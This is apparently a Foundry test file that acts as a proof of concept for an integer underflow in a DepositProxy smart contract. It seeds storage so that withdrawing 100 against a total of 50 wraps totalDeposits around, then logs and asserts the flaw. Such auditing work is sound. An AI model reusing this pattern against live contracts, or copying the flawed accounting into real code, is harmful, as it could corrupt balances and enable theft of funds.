// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol";

contract DepositProxyWithdrawUnderflowTest is Test {
    DepositProxy depositProxy;
    address owner = vm.addr(0xB);
    uint256 constant DEPOSIT_AMOUNT = 100;
    uint256 constant WITHDRAW_AMOUNT = 100;
    uint256 constant TOTAL_DEPOSITS = 50;
    uint256 expectedUnderflow = type(uint256).max - TOTAL_DEPOSITS + 1;
    
    function setUp() public {
        // Deploy contract
        depositProxy = new DepositProxy();
        
        // Set owner slot
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(address(depositProxy), ownerSlot, bytes32(uint256(uint160(owner))));
        
        // Set maxWithdrawal high enough to allow large withdrawal
        bytes32 maxWithdrawalSlot = bytes32(uint256(3));
        vm.store(address(depositProxy), maxWithdrawalSlot, bytes32(uint256(200)));
        
        // Set Deposits[owner]
        bytes32 mappingSlot = keccak256(abi.encode(owner, uint256(1)));
        vm.store(address(depositProxy), mappingSlot, bytes32(uint256(DEPOSIT_AMOUNT)));
        
        // Set totalDeposits value (less than withdrawal amount)
        bytes32 totalDepositSlot = bytes32(uint256(2));
        vm.store(address(depositProxy), totalDepositSlot, bytes32(uint256(TOTAL_DEPOSITS)));
        
        // Fund contract for withdrawal
        vm.deal(address(depositProxy), WITHDRAW_AMOUNT);
    }

    function testWithdrawUnderflow() public {
        uint256 preUnderflowTotalDeposits = depositProxy.totalDeposits();
        console.log("--- BEFORE State ---");
        console.log("totalDeposits: %s", preUnderflowTotalDeposits);
        console.log("Expected pre state: 50");
        
        console.log("--- Trigger Operation: withdraw(100) ---");
        vm.prank(owner);
        depositProxy.withdraw(WITHDRAW_AMOUNT);
        
        console.log("--- AFTER State ---");
        uint256 postUnderflowTotalDeposits = depositProxy.totalDeposits();
        console.log("totalDeposits: %s", postUnderflowTotalDeposits);
        console.log("Expected post state (underflow): %s", expectedUnderflow);
        
        // Vulnerability detection
        bool stateChanged = (preUnderflowTotalDeposits != postUnderflowTotalDeposits);
        bool underflowOccurs = (postUnderflowTotalDeposits == expectedUnderflow);
        bool vulnerabilityExists = stateChanged && underflowOccurs;
        
        console.log("--- Comparison Result ---");
        console.log("State changed: %s", stateChanged ? "YES" : "NO");
        console.log("Underflow occurred: %s", underflowOccurs ? "YES" : "NO");

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Critical underflow detected in totalDeposits");
        } else {
            console.log("Vulnerability not Exist: No underflow detected in totalDeposits");
        }

        // Original verification
        bytes32 totalDepositSlot = bytes32(uint256(2));
        uint256 newTotalDeposits = uint256(vm.load(address(depositProxy), totalDepositSlot));
        assertEq(
            newTotalDeposits, 
            expectedUnderflow,
            "totalDeposits should have underflowed"
        );
    }
}